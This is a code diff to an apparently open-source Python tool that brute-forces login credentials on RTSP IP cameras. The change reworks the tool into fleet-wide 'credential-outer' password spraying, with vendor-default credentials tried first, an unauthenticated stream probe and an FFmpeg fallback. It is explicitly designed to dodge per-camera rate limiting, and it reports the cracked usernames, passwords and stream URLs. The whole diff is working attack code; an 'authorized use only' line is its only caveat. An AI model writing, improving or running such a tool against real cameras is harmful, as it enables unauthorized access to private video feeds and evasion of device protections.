@@ -14,14 +14,20 @@ Given a list of IP cameras (or a packet capture), it:
      (``data/cameras.csv``), then the vendor-wide paths, then a set of generic
      fall-back paths (including the bare ``rtsp://host:port`` root, which a few
      DVRs accept).
-  4. Brute forces with a native RTSP ``DESCRIBE`` engine (no per-attempt FFmpeg
-     process): first an unauthenticated route-discovery pass, then a credential
-     attack that tries the fingerprinted vendor's default credential FIRST,
-     then the user-supplied user/password wordlists. Stops at the first working
-     credential+route per host.
+  4. Brute forces *credential-outer*: every host is prepared once (steps 1-3),
+     then round 1 tries each host's first credential across the WHOLE fleet,
+     round 2 the second, and so on. Because a given camera is touched only once
+     per round — not hammered with its whole wordlist back-to-back — it gets time
+     to cool down between attempts, which avoids the per-camera rate-limiting
+     that costs cameras. Each attempt is a native RTSP ``DESCRIBE`` (no
+     per-attempt FFmpeg process); a route-removed FFmpeg open is the last-resort
+     fallback for cameras the native engine can't crack. Vendor default and
+     ONVIF-accepted credentials are ordered first, so they land in round 1.
 
 Concurrency uses a thread pool (RTSP/socket work is I/O-bound), not a process
-pool. OpenCV is used only for the optional frame capture on success.
+pool — but the parallelism is now ACROSS cameras within a round, not one worker
+draining a single camera. OpenCV is used for the optional frame capture on
+success and for the route-removed FFmpeg fallback.
 
 Authorized use only — operate cameras you own or have explicit permission to
 access.
@@ -29,9 +35,14 @@ access.
 
 import os
 
-# Bound FFmpeg/RTSP connection + read time so the optional frame capture on a
-# reachable-but-slow host doesn't hang a worker. Must be set before cv2 (and
-# therefore FFmpeg) is imported.
+# Bound FFmpeg/RTSP connection + read time so the FFmpeg fallback / optional
+# frame capture on a reachable-but-slow host doesn't hang a worker. Must be set
+# before cv2 (and therefore FFmpeg) is imported.
+#
+# Transport is forced to TCP on purpose: with the bounded `stimeout` below, an
+# auto-negotiated open tries UDP first and the timeout can fire before FFmpeg
+# falls back to TCP, so UDP-lossy networks lose cameras (measured: forcing TCP
+# cracked noticeably more of a real test set than auto+timeout).
 os.environ.setdefault(
     "OPENCV_FFMPEG_CAPTURE_OPTIONS",
     "rtsp_transport;tcp|stimeout;5000000|timeout;5000000",
@@ -78,8 +89,8 @@ except Exception:
     _HAS_TQDM = False
 
 # When a tqdm bar is active, per-host log lines must go through ``tqdm.write`` so
-# they print above the bar instead of tearing it. ``crack_host`` runs on worker
-# threads, so writes to this are already serialised by ``lock`` in display().
+# they print above the bar instead of tearing it. Prepare/attempt work runs on
+# worker threads, so writes to this are already serialised by ``lock`` in display().
 _active_bar = None
 
 status_color = {
@@ -706,65 +717,58 @@ def _route_uri(host, port, raw_path, user, password):
     return f"rtsp://{host}:{port}{path}"
 
 
-def rtsp_bruteforce(host, routes, creds, timeout):
-    """Two-phase native RTSP attack. Returns a result dict on success, else None.
-
-    Phase A (route discovery): one unauthenticated DESCRIBE per route. A route
-    that streams without auth (200) is an immediate open-access hit; routes that
-    demand auth (401/403) are kept as candidates; routes that 404/400 are dropped.
-
-    Phase B (credential attack): for each credential, a full challenge+response
-    handshake (a fresh connection per attempt, challenge and reply on the SAME
-    socket) against the primary route. A 200 is success. A 404 means the
-    credential is valid but the path is wrong (auth-first cameras answer 401 for
-    every path until authenticated, then 404 for a wrong path), so we sweep the
-    remaining routes with that now-known-good credential.
-
-    Phase C (FFmpeg fallback): if the native engine never gets a decisive
-    200/404 for any credential — the "401-both" case, where the camera answers
-    401 for both a wrong credential AND a valid credential on a wrong path — fall
-    back to the original tool's method: a full FFmpeg open on the route-removed
-    ``rtsp://user:pass@host`` URL, per credential. Best-effort and OpenCV-only.
-    """
-    auth_routes = []
-    for raw_path, port in routes:
+def probe_open_access(host, routes, timeout, limit=3):
+    """One unauthenticated DESCRIBE on each of the first ``limit`` routes. Returns
+    an open-access result dict if any streams without auth (200), else None. Kept
+    to a few routes so this stays a light touch on the camera."""
+    for raw_path, port in routes[:limit]:
         uri = _route_uri(host, port, raw_path, "", "")
         code, _ = _describe_unauth(host, port, uri, timeout)
         if code == 200:
             return {"user": "", "password": "", "url": uri, "unauthenticated": True}
-        if code in (401, 403):
-            auth_routes.append((raw_path, port))
+    return None
 
-    candidate_routes = auth_routes or routes
-    if candidate_routes:
-        primary_path, primary_port = candidate_routes[0]
-        for user, password in creds:
-            uri = _route_uri(host, primary_port, primary_path, user, password)
-            code = _describe_auth(host, primary_port, uri, user, password, timeout)
-            if code == 200:
-                return {"user": user, "password": password, "url": uri}
-            if code == 404:  # credential valid, wrong path -> sweep the other routes
-                for raw_path, port in candidate_routes:
-                    sweep_uri = _route_uri(host, port, raw_path, user, password)
-                    sweep_code = _describe_auth(host, port, sweep_uri, user, password, timeout)
-                    if sweep_code == 200:
-                        return {"user": user, "password": password, "url": sweep_uri}
-                # Authenticated, but none of our known routes streamed. Report the
-                # working credential anyway (path unknown).
-                return {"user": user, "password": password, "url": uri, "no_route": True}
 
-    # Phase C — 401-both fallback. The native DESCRIBE engine was inconclusive
-    # (or Phase A pruned every route). Try each credential the original way: a
-    # full FFmpeg open on the route-removed URL. FFmpeg's complete negotiation
-    # confirms a credential where a bare DESCRIBE stays ambiguously 401.
-    if _HAS_CV2:
-        fallback_port = (candidate_routes[0][1] if candidate_routes
-                         else routes[0][1] if routes else DEFAULT_PORTS["rtsp"])
-        for user, password in creds:
-            url = _ffmpeg_login(host, fallback_port, user, password)
-            if url:
-                return {"user": user, "password": password, "url": url,
-                        "ffmpeg": True}
+def native_attempt(host, routes, cred, timeout):
+    """Try ONE credential against a host's routes with the native RTSP engine.
+    Returns a result dict on success, else None.
+
+    A single challenge+response handshake against the primary route (challenge
+    and reply on the SAME socket — required by connection-bound nonces). 200 is
+    success. 404 means the credential is valid but the path is wrong (auth-first
+    cameras answer 401 for every path until authenticated, then 404 for a wrong
+    path), so the remaining routes are swept with that now-known-good credential.
+    401/None is a miss for this credential — the caller moves to the next one.
+
+    Just one credential per call by design: the caller drives the outer loop
+    credential-by-credential across every host, so any one camera is touched once
+    per round and gets time to cool down between attempts."""
+    if not routes:
+        return None
+    user, password = cred
+    primary_path, primary_port = routes[0]
+    uri = _route_uri(host, primary_port, primary_path, user, password)
+    code = _describe_auth(host, primary_port, uri, user, password, timeout)
+    if code == 200:
+        return {"user": user, "password": password, "url": uri}
+    if code == 404:  # credential valid, wrong path -> sweep the other routes
+        for raw_path, port in routes:
+            sweep_uri = _route_uri(host, port, raw_path, user, password)
+            if _describe_auth(host, port, sweep_uri, user, password, timeout) == 200:
+                return {"user": user, "password": password, "url": sweep_uri}
+        # Authenticated, but none of our known routes streamed.
+        return {"user": user, "password": password, "url": uri, "no_route": True}
+    return None
+
+
+def ffmpeg_attempt(host, port, cred):
+    """Try ONE credential via the FFmpeg route-removed open (the original tool's
+    method). Returns a result dict on success, else None. OpenCV-only."""
+    if not _HAS_CV2:
+        return None
+    url = _ffmpeg_login(host, port, cred[0], cred[1])
+    if url:
+        return {"user": cred[0], "password": cred[1], "url": url, "ffmpeg": True}
     return None
 
 
@@ -850,19 +854,23 @@ def ordered_credentials(vendor, base_combos, db, options):
     return ordered
 
 
-def crack_host(target, base_combos, db, options):
-    """Fingerprint one host, build its vendor/model routes, then brute force the
-    credential x route space (first success wins). Returns a result dict."""
+def prepare_host(target, base_combos, db, options):
+    """Set one host up for the credential-outer attack WITHOUT trying any
+    credential yet: reachability, fingerprint, the ordered route list (ONVIF
+    exact path first) and the ordered credential list. Returns a state dict the
+    round driver consumes. Doing the fingerprint/route work once here — and no
+    25-route discovery burst — keeps per-camera connection volume low so the
+    device doesn't rate-limit before the credential rounds even start."""
     host, http_port, rtsp_port = parse_target(target)
     if options.get("http_port"):        # -H overrides the HTTP/ONVIF port
         http_port = options["http_port"]
 
     if options["reach_timeout"] > 0 and not tcp_reachable(
             host, [rtsp_port, http_port], options["reach_timeout"]):
-        with lock:
-            if options["verbose"]:
+        if options["verbose"]:
+            with lock:
                 display('-', f"{target} => Unreachable (skipped)")
-        return {"status": "UNREACHABLE", "ip": target, "vendor": "", "model": "", "url": ""}
+        return {"target": target, "status": "UNREACHABLE", "vendor": "", "model": ""}
 
     vendor, model = (None, None)
     if options["fingerprint"]:
@@ -894,26 +902,8 @@ def crack_host(target, base_combos, db, options):
         if onvif_cred and onvif_cred in creds:
             creds = [onvif_cred] + [c for c in creds if c != onvif_cred]
 
-    result = rtsp_bruteforce(host, routes, creds, options["rtsp_timeout"])
-    if result:
-        if capture_frame:
-            capture_frame_from_url(result["url"], host)
-        note = ""
-        if result.get("unauthenticated"):
-            note = " (no auth)"
-        elif result.get("no_route"):
-            note = " (auth ok, stream path unknown)"
-        elif result.get("ffmpeg"):
-            note = " (via ffmpeg, route removed)"
-        with lock:
-            display('+', f"{result['user']}:{result['password']}"
-                         f"@{target} => "
-                         f"Access Granted (vendor={vendor or '?'}){note}")
-        return {"status": "OK", "ip": target, "user": result["user"],
-                "password": result["password"], "vendor": vendor or "",
-                "model": model or "", "url": result["url"]}
-    return {"status": "UNRESOLVED", "ip": target, "vendor": vendor or "",
-            "model": model or "", "url": ""}
+    return {"target": target, "status": "READY", "host": host, "rtsp_port": rtsp_port,
+            "routes": routes, "creds": creds, "vendor": vendor or "", "model": model or ""}
 
 
 # --------------------------------------------------------------------------
@@ -1157,29 +1147,119 @@ if __name__ == "__main__":
         display(':', f"Fingerprinting = {fingerprint_enabled}, Vendor Defaults = {options['use_defaults']}, All Defaults Fallback = {options['all_defaults']}, Max Routes = {max_routes}")
         display(':', f"Starting {threads_number} Threads", start='\n')
 
-        t1 = time()
         successful_logins = []
-        unreachable = 0
-        if _HAS_TQDM:
-            _active_bar = tqdm(total=total_ips, desc="Brute forcing", unit="host")
-        with ThreadPoolExecutor(max_workers=threads_number) as executor:
-            futures = {executor.submit(crack_host, ip, base_combos, db, options): ip for ip in ips}
-            for future in as_completed(futures):
-                result = future.result()
-                if result["status"] == "OK":
-                    successful_logins.append(result)
-                elif result["status"] == "UNREACHABLE":
-                    unreachable += 1
-                if _active_bar is not None:
-                    _active_bar.update(1)
-        if _active_bar is not None:
-            _active_bar.close()
-            _active_bar = None
+        method_counts = defaultdict(int)
+
+        def run_batch(items, fn, desc):
+            """Map ``fn`` over ``items`` concurrently (bounded by threads_number).
+            Returns a list of ``(item, result)``. Runs to completion before
+            returning, so a per-round closure can safely capture the round index."""
+            global _active_bar
+            outcomes = []
+            bar = tqdm(total=len(items), desc=desc, unit="host") if _HAS_TQDM else None
+            _active_bar = bar
+            try:
+                with ThreadPoolExecutor(max_workers=max(1, threads_number)) as executor:
+                    futures = {executor.submit(fn, item): item for item in items}
+                    for future in as_completed(futures):
+                        outcomes.append((futures[future], future.result()))
+                        if bar is not None:
+                            bar.update(1)
+            finally:
+                if bar is not None:
+                    bar.close()
+                _active_bar = None
+            return outcomes
+
+        solved_targets = set()
+
+        def register(state, result):
+            """Display and record a solved host."""
+            if capture_frame:
+                capture_frame_from_url(result["url"], state["host"])
+            note, method = "", "native"
+            if result.get("unauthenticated"):
+                note, method = " (no auth)", "no-auth"
+            elif result.get("no_route"):
+                note, method = " (auth ok, stream path unknown)", "no-route"
+            elif result.get("ffmpeg"):
+                note, method = " (via ffmpeg, route removed)", "ffmpeg"
+            with lock:
+                display('+', f"{result['user']}:{result['password']}"
+                             f"@{state['target']} => "
+                             f"Access Granted (vendor={state['vendor'] or '?'}){note}")
+            successful_logins.append({"status": "OK", "ip": state["target"],
+                                      "user": result["user"], "password": result["password"],
+                                      "vendor": state["vendor"], "model": state["model"],
+                                      "url": result["url"], "method": method})
+            method_counts[method] += 1
+            solved_targets.add(state["target"])
+
+        def credential_rounds(states, attempt_fn, label):
+            """Credential-OUTER attack: round i tries every still-unsolved host's
+            i-th credential, so a given camera is hit once per round and cools
+            down while the rest of the fleet is tried — the opposite of hammering
+            one camera with its whole wordlist back-to-back."""
+            remaining = [st for st in states if st["target"] not in solved_targets]
+            total_rounds = max((len(st["creds"]) for st in remaining), default=0)
+            for i in range(total_rounds):
+                remaining = [st for st in remaining if st["target"] not in solved_targets]
+                batch = [st for st in remaining if i < len(st["creds"])]
+                if not batch:
+                    continue
+                for state, result in run_batch(
+                        batch, lambda st: attempt_fn(st, st["creds"][i]),
+                        f"{label} cred {i + 1}/{total_rounds}"):
+                    if result:
+                        register(state, result)
+                if len(solved_targets) == len({s["target"] for s in states}):
+                    break
+
+        t1 = time()
+        # Phase 1 — prepare every host ONCE (reachability, fingerprint, routes,
+        # credentials). No per-host credential attempts here, so no burst.
+        prepared = [st for _, st in run_batch(
+            ips, lambda ip: prepare_host(ip, base_combos, db, options), "Fingerprinting")]
+        ready = [st for st in prepared if st["status"] == "READY"]
+        unreachable = sum(1 for st in prepared if st["status"] == "UNREACHABLE")
+
+        # Round 0 — cheap open-access (unauthenticated) check on each host.
+        for state, result in run_batch(
+                ready, lambda st: probe_open_access(st["host"], st["routes"], options["rtsp_timeout"]),
+                "Open-access"):
+            if result:
+                register(state, result)
+
+        # Phase 2 — native credential-outer rounds.
+        credential_rounds(
+            ready,
+            lambda st, cred: native_attempt(st["host"], st["routes"], cred, options["rtsp_timeout"]),
+            "Brute")
+
+        # Phase 3 — FFmpeg route-removed fallback (original tool's method), also
+        # credential-outer, for hosts the native engine couldn't crack.
+        if _HAS_CV2:
+            credential_rounds(
+                ready,
+                lambda st, cred: ffmpeg_attempt(st["host"], st["rtsp_port"], cred),
+                "FFmpeg")
         t2 = time()
 
-        display('+', f"All {threads_number} Threads Completed Execution", start='\n')
+        unsolved = [st for st in ready if st["target"] not in solved_targets]
+        if options["verbose"]:
+            for st in unsolved:
+                with lock:
+                    display('-', f"{st['target']} => Reached but no credential found "
+                                 f"(vendor={st['vendor'] or '?'})")
+        unresolved = len(unsolved)
+
+        display('+', f"All Threads Completed Execution", start='\n')
         display(':', f"\tTotal IP Addresses       = {total_ips}")
         display(':', f"\tSuccessful Authorization = {len(successful_logins)}")
+        if successful_logins:
+            breakdown = ", ".join(f"{m}={method_counts[m]}" for m in sorted(method_counts))
+            display(':', f"\t  by method              = {breakdown}")
+        display(':', f"\tReached, No Credential   = {unresolved}")
         display(':', f"\tUnreachable Hosts        = {unreachable}")
         display(':', f"\tTime Taken               = {t2-t1:.2f} seconds")
         if t2 > t1:
